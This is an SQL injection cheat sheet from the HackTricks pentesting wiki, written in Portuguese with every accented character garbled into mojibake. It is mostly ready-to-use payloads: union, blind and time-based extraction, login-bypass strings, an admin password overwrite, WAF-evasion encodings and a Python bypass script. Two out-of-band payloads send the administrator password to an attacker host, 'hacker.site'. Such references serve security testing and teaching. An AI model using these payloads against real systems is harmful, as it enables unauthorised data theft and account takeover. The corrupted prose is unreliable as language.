# SQL Injection

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## O que √© inje√ß√£o SQL?

Uma **inje√ß√£o SQL** √© uma falha de seguran√ßa que permite que atacantes **interfiram nas consultas ao banco de dados** de uma aplica√ß√£o. Essa vulnerabilidade pode permitir que atacantes **visualizem**, **modifiquem** ou **deletam** dados que n√£o deveriam acessar, incluindo informa√ß√µes de outros usu√°rios ou qualquer dado que a aplica√ß√£o possa acessar. Tais a√ß√µes podem resultar em mudan√ßas permanentes na funcionalidade ou conte√∫do da aplica√ß√£o ou at√© mesmo comprometimento do servidor ou nega√ß√£o de servi√ßo.


## Detec√ß√£o de ponto de entrada

Quando um site parece ser **vulner√°vel a inje√ß√£o SQL (SQLi)** devido a respostas incomuns do servidor a entradas relacionadas a SQLi, o **primeiro passo** √© entender como **injetar dados na consulta sem interromp√™-la**. Isso requer identificar o m√©todo para **escapar do contexto atual** de forma eficaz.  
Estes s√£o alguns exemplos √∫teis:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Ent√£o, voc√™ precisa saber como **corrigir a consulta para que n√£o haja erros**. Para corrigir a consulta, voc√™ pode **inserir** dados para que a **consulta anterior aceite os novos dados**, ou voc√™ pode apenas **inserir** seus dados e **adicionar um s√≠mbolo de coment√°rio no final**.

_Observe que se voc√™ puder ver mensagens de erro ou notar diferen√ßas quando uma consulta est√° funcionando e quando n√£o est√°, esta fase ser√° mais f√°cil._

### **Coment√°rios**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirmando com opera√ß√µes l√≥gicas

Um m√©todo confi√°vel para confirmar uma vulnerabilidade de SQL injection envolve executar uma **opera√ß√£o l√≥gica** e observar os resultados esperados. Por exemplo, um par√¢metro GET como `?username=Peter` que gera conte√∫do id√™ntico quando modificado para `?username=Peter' ou '1'='1` indica uma vulnerabilidade de SQL injection.

Da mesma forma, a aplica√ß√£o de **opera√ß√µes matem√°ticas** serve como uma t√©cnica de confirma√ß√£o eficaz. Por exemplo, se acessar `?id=1` e `?id=2-1` produzir os mesmos resultados, isso √© indicativo de SQL injection.

Exemplos demonstrando a confirma√ß√£o de opera√ß√£o l√≥gica:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Esta lista de palavras foi criada para tentar **confirmar SQLinjections** da maneira proposta:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmando com Tempo

Em alguns casos, voc√™ **n√£o notar√° nenhuma mudan√ßa** na p√°gina que est√° testando. Portanto, uma boa maneira de **descobrir SQL injections blindas** √© fazer com que o DB execute a√ß√µes que ter√£o um **impacto no tempo** que a p√°gina leva para carregar.\
Portanto, vamos concatenar na consulta SQL uma opera√ß√£o que levar√° muito tempo para ser conclu√≠da:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
Em alguns casos, as **fun√ß√µes sleep n√£o ser√£o permitidas**. Ent√£o, em vez de usar essas fun√ß√µes, voc√™ poderia fazer a consulta **realizar opera√ß√µes complexas** que levar√£o v√°rios segundos. _Exemplos dessas t√©cnicas ser√£o comentados separadamente em cada tecnologia (se houver)_.

### Identificando o Back-end

A melhor maneira de identificar o back-end √© tentar executar fun√ß√µes dos diferentes back-ends. Voc√™ poderia usar as _**fun√ß√µes sleep**_ da se√ß√£o anterior ou estas (tabela do [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Tamb√©m, se voc√™ tiver acesso √† sa√≠da da consulta, poder√° fazer com que **imprima a vers√£o do banco de dados**.

{% hint style="info" %}
Na continua√ß√£o, vamos discutir diferentes m√©todos para explorar diferentes tipos de SQL Injection. Usaremos MySQL como exemplo.
{% endhint %}

### Identificando com PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Explorando Baseado em Union

### Detectando o n√∫mero de colunas

Se voc√™ puder ver a sa√≠da da consulta, esta √© a melhor maneira de explor√°-la.\
Primeiro de tudo, precisamos descobrir o **n√∫mero** de **colunas** que a **requisi√ß√£o inicial** est√° retornando. Isso ocorre porque **ambas as consultas devem retornar o mesmo n√∫mero de colunas**.\
Dois m√©todos s√£o tipicamente usados para esse prop√≥sito:

#### Order/Group by

Para determinar o n√∫mero de colunas em uma consulta, ajuste incrementalmente o n√∫mero usado nas cl√°usulas **ORDER BY** ou **GROUP BY** at√© que uma resposta falsa seja recebida. Apesar das funcionalidades distintas de **GROUP BY** e **ORDER BY** dentro do SQL, ambos podem ser utilizados de forma id√™ntica para determinar a contagem de colunas da consulta.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Selecione mais e mais valores nulos at√© que a consulta esteja correta:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Voc√™ deve usar valores `null`, pois em alguns casos o tipo das colunas de ambos os lados da consulta deve ser o mesmo e null √© v√°lido em todos os casos._

### Extrair nomes de bancos de dados, nomes de tabelas e nomes de colunas

Nos pr√≥ximos exemplos, vamos recuperar o nome de todos os bancos de dados, o nome da tabela de um banco de dados, os nomes das colunas da tabela:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Existe uma maneira diferente de descobrir esses dados em cada banco de dados diferente, mas a metodologia √© sempre a mesma._

## Exploiting Hidden Union Based

Quando a sa√≠da de uma consulta √© vis√≠vel, mas uma inje√ß√£o baseada em uni√£o parece inating√≠vel, isso significa a presen√ßa de uma **inje√ß√£o baseada em uni√£o oculta**. Esse cen√°rio frequentemente leva a uma situa√ß√£o de inje√ß√£o cega. Para transformar uma inje√ß√£o cega em uma baseada em uni√£o, √© necess√°rio discernir a consulta de execu√ß√£o no backend.

Isso pode ser realizado atrav√©s do uso de t√©cnicas de inje√ß√£o cega juntamente com as tabelas padr√£o espec√≠ficas do seu Sistema de Gerenciamento de Banco de Dados (DBMS) alvo. Para entender essas tabelas padr√£o, √© aconselh√°vel consultar a documenta√ß√£o do DBMS alvo.

Uma vez que a consulta tenha sido extra√≠da, √© necess√°rio adaptar seu payload para fechar com seguran√ßa a consulta original. Em seguida, uma consulta de uni√£o √© anexada ao seu payload, facilitando a explora√ß√£o da inje√ß√£o baseada em uni√£o rec√©m-acess√≠vel.

Para obter insights mais abrangentes, consulte o artigo completo dispon√≠vel em [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Exploiting Error based

Se por algum motivo voc√™ **n√£o pode** ver a **sa√≠da** da **consulta**, mas pode **ver as mensagens de erro**, voc√™ pode fazer com que essas mensagens de erro **exfiltratem** dados do banco de dados.\
Seguindo um fluxo semelhante ao da explora√ß√£o baseada em Uni√£o, voc√™ poderia conseguir despejar o DB.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Explorando Blind SQLi

Neste caso, voc√™ n√£o pode ver os resultados da consulta ou os erros, mas pode **distinguir** quando a consulta **retorna** uma resposta **verdadeira** ou **falsa** porque h√° conte√∫dos diferentes na p√°gina.\
Neste caso, voc√™ pode abusar desse comportamento para despejar o banco de dados caractere por caractere:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploiting Error Blind SQLi

Este √© o **mesmo caso de antes**, mas em vez de distinguir entre uma resposta verdadeira/falsa da consulta, voc√™ pode **distinguir entre** um **erro** na consulta SQL ou n√£o (talvez porque o servidor HTTP falhe). Portanto, neste caso, voc√™ pode for√ßar um erro SQL toda vez que adivinhar corretamente o caractere:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploiting Time Based SQLi

Neste caso, **n√£o h√°** nenhuma maneira de **distinguir** a **resposta** da consulta com base no contexto da p√°gina. Mas, voc√™ pode fazer a p√°gina **demorar mais para carregar** se o caractere adivinhado estiver correto. J√° vimos essa t√©cnica em uso anteriormente para [confirmar uma vulnerabilidade de SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Consultas Empilhadas

Voc√™ pode usar consultas empilhadas para **executar v√°rias consultas em sucess√£o**. Note que, enquanto as consultas subsequentes s√£o executadas, os **resultados** **n√£o s√£o retornados para a aplica√ß√£o**. Portanto, essa t√©cnica √© principalmente √∫til em rela√ß√£o a **vulnerabilidades blindas**, onde voc√™ pode usar uma segunda consulta para acionar uma consulta DNS, erro condicional ou atraso de tempo.

**Oracle** n√£o suporta **consultas empilhadas.** **MySQL, Microsoft** e **PostgreSQL** as suportam: `QUERY-1-HERE; QUERY-2-HERE`

## Explora√ß√£o Fora de Banda

Se **nenhum outro** m√©todo de explora√ß√£o **funcionou**, voc√™ pode tentar fazer com que o **banco de dados exfiltre** as informa√ß√µes para um **host externo** controlado por voc√™. Por exemplo, via consultas DNS:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltra√ß√£o de dados fora de banda via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Explora√ß√£o Automatizada

Verifique o [SQLMap Cheatsheet](sqlmap/) para explorar uma vulnerabilidade de SQLi com [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informa√ß√µes espec√≠ficas da tecnologia

J√° discutimos todas as maneiras de explorar uma vulnerabilidade de SQL Injection. Encontre mais algumas dicas dependentes da tecnologia de banco de dados neste livro:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ou voc√™ encontrar√° **muitas dicas sobre: MySQL, PostgreSQL, Oracle, MSSQL, SQLite e HQL em** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Bypass de autentica√ß√£o

Lista para tentar contornar a funcionalidade de login:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Bypass de autentica√ß√£o de hash bruto
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Esta consulta demonstra uma vulnerabilidade quando o MD5 √© usado com verdadeiro para sa√≠da bruta em verifica√ß√µes de autentica√ß√£o, tornando o sistema suscet√≠vel a SQL injection. Os atacantes podem explorar isso criando entradas que, quando hashadas, produzem partes inesperadas de comandos SQL, levando ao acesso n√£o autorizado.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### Bypass de autentica√ß√£o por hash injetado
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Lista recomendada**:

Voc√™ deve usar como nome de usu√°rio cada linha da lista e como senha sempre: _**Pass1234.**_\
_(Esses payloads tamb√©m est√£o inclu√≠dos na grande lista mencionada no in√≠cio desta se√ß√£o)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### Bypass de Autentica√ß√£o GBK

SE ' estiver sendo escapado, voc√™ pode usar %A8%27, e quando ' for escapado, ser√° criado: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
```markdown
Python script:
```
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Inje√ß√£o poliglota (multicontexto)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Modificar a senha de um objeto/usu√°rio existente

Para isso, voc√™ deve tentar **criar um novo objeto nomeado como o "objeto mestre"** (provavelmente **admin** no caso de usu√°rios) modificando algo:

* Criar usu√°rio nomeado: **AdMIn** (letras mai√∫sculas e min√∫sculas)
* Criar um usu√°rio nomeado: **admin=**
* **SQL Truncation Attack** (quando h√° algum tipo de **limite de comprimento** no nome de usu√°rio ou e-mail) --> Criar usu√°rio com nome: **admin \[muitos espa√ßos] a**

#### SQL Truncation Attack

Se o banco de dados for vulner√°vel e o n√∫mero m√°ximo de caracteres para o nome de usu√°rio for, por exemplo, 30 e voc√™ quiser se passar pelo usu√°rio **admin**, tente criar um nome de usu√°rio chamado: "_admin \[30 espa√ßos] a_" e qualquer senha.

O banco de dados ir√° **verificar** se o **nome de usu√°rio** introduzido **existe** dentro do banco de dados. Se **n√£o**, ele ir√° **cortar** o **nome de usu√°rio** para o **n√∫mero m√°ximo permitido de caracteres** (neste caso para: "_admin \[25 espa√ßos]_") e ent√£o ir√° **remover automaticamente todos os espa√ßos no final atualizando** dentro do banco de dados o usu√°rio "**admin**" com a **nova senha** (algum erro pode aparecer, mas isso n√£o significa que n√£o funcionou).

Mais informa√ß√µes: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Note: Este ataque n√£o funcionar√° mais como descrito acima nas √∫ltimas instala√ß√µes do MySQL. Embora as compara√ß√µes ainda ignorem espa√ßos em branco no final por padr√£o, tentar inserir uma string que seja mais longa do que o comprimento de um campo resultar√° em um erro, e a inser√ß√£o falhar√°. Para mais informa√ß√µes sobre essa verifica√ß√£o: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### Verifica√ß√£o baseada em tempo de inser√ß√£o do MySQL

Adicione quantos `','',''` voc√™ considerar para sair da declara√ß√£o VALUES. Se o atraso for executado, voc√™ tem uma SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

A cl√°usula `ON DUPLICATE KEY UPDATE` no MySQL √© utilizada para especificar a√ß√µes que o banco de dados deve tomar quando uma tentativa √© feita para inserir uma linha que resultaria em um valor duplicado em um √≠ndice UNIQUE ou PRIMARY KEY. O seguinte exemplo demonstra como esse recurso pode ser explorado para modificar a senha de uma conta de administrador:

Exemplo de Inje√ß√£o de Payload:

Um payload de inje√ß√£o pode ser elaborado da seguinte forma, onde duas linhas s√£o tentadas para serem inseridas na tabela `users`. A primeira linha √© uma isca, e a segunda linha visa o e-mail de um administrador existente com a inten√ß√£o de atualizar a senha:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Aqui est√° como funciona:

- A consulta tenta inserir duas linhas: uma para `generic_user@example.com` e outra para `admin_generic@example.com`.
- Se a linha para `admin_generic@example.com` j√° existir, a cl√°usula `ON DUPLICATE KEY UPDATE` √© acionada, instruindo o MySQL a atualizar o campo `password` da linha existente para "bcrypt_hash_of_newpassword".
- Consequentemente, a autentica√ß√£o pode ser tentada usando `admin_generic@example.com` com a senha correspondente ao hash bcrypt ("bcrypt_hash_of_newpassword" representa o hash bcrypt da nova senha, que deve ser substitu√≠do pelo hash real da senha desejada).

### Extrair informa√ß√µes

#### Criando 2 contas ao mesmo tempo

Ao tentar criar um novo usu√°rio, nome de usu√°rio, senha e e-mail s√£o necess√°rios:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Usando decimal ou hexadecimal

Com esta t√©cnica, voc√™ pode extrair informa√ß√µes criando apenas 1 conta. √â importante notar que voc√™ n√£o precisa comentar nada.

Usando **hex2dec** e **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Para obter o texto, voc√™ pode usar:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Usando **hex** e **replace** (e **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervente para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Inje√ß√£o SQL Roteada

A inje√ß√£o SQL roteada √© uma situa√ß√£o em que a consulta injet√°vel n√£o √© a que gera a sa√≠da, mas a sa√≠da da consulta injet√°vel vai para a consulta que gera a sa√≠da. ([Do Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Exemplo:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Bypass de WAF

[Bypasses iniciais daqui](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass sem espa√ßos

Sem Espa√ßo (%20) - bypass usando alternativas de espa√ßo em branco
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - contornar usando coment√°rios
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - contornar usando par√™nteses
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - bypass usando OFFSET, FROM e JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Bypasses Gen√©ricos

Lista negra usando palavras-chave - bypass usando mai√∫sculas/min√∫sculas
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist usando palavras-chave sem diferencia√ß√£o entre mai√∫sculas e min√∫sculas - contornar usando um operador equivalente
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass de WAF com Nota√ß√£o Cient√≠fica

Voc√™ pode encontrar uma explica√ß√£o mais detalhada desse truque no [blog da gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Basicamente, voc√™ pode usar a nota√ß√£o cient√≠fica de maneiras inesperadas para contornar o WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

Primeiramente, note que se a **consulta original e a tabela de onde voc√™ deseja extrair a flag tiverem a mesma quantidade de colunas**, voc√™ pode simplesmente fazer: `0 UNION SELECT * FROM flag`

√â poss√≠vel **acessar a terceira coluna de uma tabela sem usar seu nome** usando uma consulta como a seguinte: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, ent√£o em uma sqlinjection isso pareceria assim:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ou usando um **bypass de v√≠rgula**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Este truque foi retirado de [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Ferramentas sugeridoras de bypass de WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Outros Guias

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
